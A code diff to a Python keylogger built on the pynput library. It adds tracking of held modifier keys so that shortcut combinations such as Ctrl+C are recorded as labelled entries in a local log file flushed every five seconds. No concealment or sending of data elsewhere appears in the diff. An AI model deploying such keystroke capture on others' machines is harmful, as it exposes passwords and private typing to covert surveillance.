@@ -25,42 +25,55 @@ from pynput import keyboard
 DEFAULT_LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
 FLUSH_INTERVAL  = 5   # seconds between auto-flushes to disk
 
-# ── Special-key display map ───────────────────────────────────────────────────
+# ── Modifier key sets ────────────────────────────────────────────────────────
+
+MODIFIER_KEYS = {
+    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
+    keyboard.Key.alt_l,  keyboard.Key.alt_r,
+    keyboard.Key.shift,  keyboard.Key.shift_r,
+    keyboard.Key.cmd,    keyboard.Key.cmd_r if hasattr(keyboard.Key, 'cmd_r') else keyboard.Key.cmd,
+}
+
+# ── Special-key display map (non-modifier named keys) ─────────────────────────
 
 SPECIAL_KEY_MAP = {
     keyboard.Key.space:        " ",
     keyboard.Key.enter:        "\n[ENTER]\n",
-    keyboard.Key.tab:          "[TAB]",
-    keyboard.Key.backspace:    "[BACKSPACE]",
-    keyboard.Key.delete:       "[DELETE]",
-    keyboard.Key.esc:          "[ESC]",
-    keyboard.Key.caps_lock:    "[CAPS LOCK]",
-    keyboard.Key.shift:        "[SHIFT]",
-    keyboard.Key.shift_r:      "[SHIFT]",
-    keyboard.Key.ctrl_l:       "[CTRL]",
-    keyboard.Key.ctrl_r:       "[CTRL]",
-    keyboard.Key.alt_l:        "[ALT]",
-    keyboard.Key.alt_r:        "[ALT]",
-    keyboard.Key.cmd:          "[WIN]",
-    keyboard.Key.up:           "[↑]",
-    keyboard.Key.down:         "[↓]",
-    keyboard.Key.left:         "[←]",
-    keyboard.Key.right:        "[→]",
-    keyboard.Key.home:         "[HOME]",
-    keyboard.Key.end:          "[END]",
-    keyboard.Key.page_up:      "[PGUP]",
-    keyboard.Key.page_down:    "[PGDN]",
-    keyboard.Key.insert:       "[INSERT]",
-    keyboard.Key.print_screen: "[PRTSC]",
-    keyboard.Key.pause:        "[PAUSE]",
-    keyboard.Key.num_lock:     "[NUMLOCK]",
-    keyboard.Key.scroll_lock:  "[SCROLLOCK]",
-    keyboard.Key.f1:  "[F1]",  keyboard.Key.f2:  "[F2]",
-    keyboard.Key.f3:  "[F3]",  keyboard.Key.f4:  "[F4]",
-    keyboard.Key.f5:  "[F5]",  keyboard.Key.f6:  "[F6]",
-    keyboard.Key.f7:  "[F7]",  keyboard.Key.f8:  "[F8]",
-    keyboard.Key.f9:  "[F9]",  keyboard.Key.f10: "[F10]",
-    keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
+    keyboard.Key.tab:          "TAB",
+    keyboard.Key.backspace:    "BACKSPACE",
+    keyboard.Key.delete:       "DELETE",
+    keyboard.Key.esc:          "ESC",
+    keyboard.Key.caps_lock:    "CAPS LOCK",
+    keyboard.Key.up:           "↑",
+    keyboard.Key.down:         "↓",
+    keyboard.Key.left:         "←",
+    keyboard.Key.right:        "→",
+    keyboard.Key.home:         "HOME",
+    keyboard.Key.end:          "END",
+    keyboard.Key.page_up:      "PGUP",
+    keyboard.Key.page_down:    "PGDN",
+    keyboard.Key.insert:       "INSERT",
+    keyboard.Key.print_screen: "PRTSC",
+    keyboard.Key.pause:        "PAUSE",
+    keyboard.Key.num_lock:     "NUMLOCK",
+    keyboard.Key.scroll_lock:  "SCROLLOCK",
+    keyboard.Key.f1:  "F1",  keyboard.Key.f2:  "F2",
+    keyboard.Key.f3:  "F3",  keyboard.Key.f4:  "F4",
+    keyboard.Key.f5:  "F5",  keyboard.Key.f6:  "F6",
+    keyboard.Key.f7:  "F7",  keyboard.Key.f8:  "F8",
+    keyboard.Key.f9:  "F9",  keyboard.Key.f10: "F10",
+    keyboard.Key.f11: "F11", keyboard.Key.f12: "F12",
+}
+
+# Map modifier keys -> label used in combo strings
+MODIFIER_LABELS = {
+    keyboard.Key.ctrl_l:  "CTRL",
+    keyboard.Key.ctrl_r:  "CTRL",
+    keyboard.Key.alt_l:   "ALT",
+    keyboard.Key.alt_r:   "ALT",
+    keyboard.Key.shift:   "SHIFT",
+    keyboard.Key.shift_r: "SHIFT",
+    keyboard.Key.cmd:     "WIN",
 }
 
 # ── KeyLogger core ────────────────────────────────────────────────────────────
@@ -75,6 +88,8 @@ class KeyLogger:
         self._listener    = None
         self._log_path    = ""
         self.keystroke_count = 0
+        # Track currently held modifier keys
+        self._held_modifiers: set = set()
 
     def _create_log_file(self) -> str:
         os.makedirs(self.log_dir, exist_ok=True)
@@ -87,21 +102,73 @@ class KeyLogger:
             f.write(f"{'='*60}\n\n")
         return path
 
-    def _format_key(self, key) -> str:
+    def _get_base_label(self, key) -> str:
+        """Return the human-readable label for a non-modifier key."""
+        # Named special key (tab, enter, arrows, Fn…)
         if key in SPECIAL_KEY_MAP:
             return SPECIAL_KEY_MAP[key]
+        # Regular character key
         try:
-            return key.char if key.char is not None else f"[{key}]"
+            ch = key.char
+            if ch is None:
+                return str(key)
+            # Control characters: Ctrl+A → \x01, etc.
+            if ord(ch) < 32:
+                return chr(ord(ch) + 64)   # \x01 → 'A', \x03 → 'C', …
+            return ch
         except AttributeError:
-            return f"[{key}]"
+            return str(key)
+
+    def _active_modifier_labels(self) -> list[str]:
+        """Deduplicated, ordered list of held modifier labels."""
+        seen = set()
+        result = []
+        # Fixed priority order: CTRL → ALT → SHIFT → WIN
+        priority = [
+            keyboard.Key.ctrl_l,  keyboard.Key.ctrl_r,
+            keyboard.Key.alt_l,   keyboard.Key.alt_r,
+            keyboard.Key.shift,   keyboard.Key.shift_r,
+            keyboard.Key.cmd,
+        ]
+        for mk in priority:
+            if mk in self._held_modifiers:
+                label = MODIFIER_LABELS.get(mk, str(mk))
+                if label not in seen:
+                    seen.add(label)
+                    result.append(label)
+        return result
 
     def _on_press(self, key):
-        char = self._format_key(key)
+        # Update modifier state first
+        if key in MODIFIER_LABELS:
+            self._held_modifiers.add(key)
+            return   # don't log bare modifier key-down events
+
+        base  = self._get_base_label(key)
+        mods  = self._active_modifier_labels()
+
+        if mods:
+            # Shortcut combo — always bracket it
+            combo = "+".join(mods + [base.upper() if len(base) == 1 else base])
+            char  = f"[{combo}]"
+        else:
+            # Plain key
+            if base in ("\n[ENTER]\n",):
+                char = base
+            elif len(base) > 1:
+                char = f"[{base}]"
+            else:
+                char = base
+
         with self._lock:
             self._buffer.append(char)
             self.keystroke_count += 1
         if self.on_keystroke:
             self.on_keystroke(self.keystroke_count)
+
+    def _on_release(self, key):
+        """Remove modifier from held set when released."""
+        self._held_modifiers.discard(key)
 
     def _flush(self):
         with self._lock:
@@ -129,9 +196,13 @@ class KeyLogger:
         self._stop.clear()
         self.keystroke_count = 0
         self._buffer.clear()
+        self._held_modifiers.clear()
         self._log_path = self._create_log_file()
         threading.Thread(target=self._auto_flush_loop, daemon=True).start()
-        self._listener = keyboard.Listener(on_press=self._on_press)
+        self._listener = keyboard.Listener(
+            on_press=self._on_press,
+            on_release=self._on_release,
+        )
         self._listener.start()
         return self._log_path
 
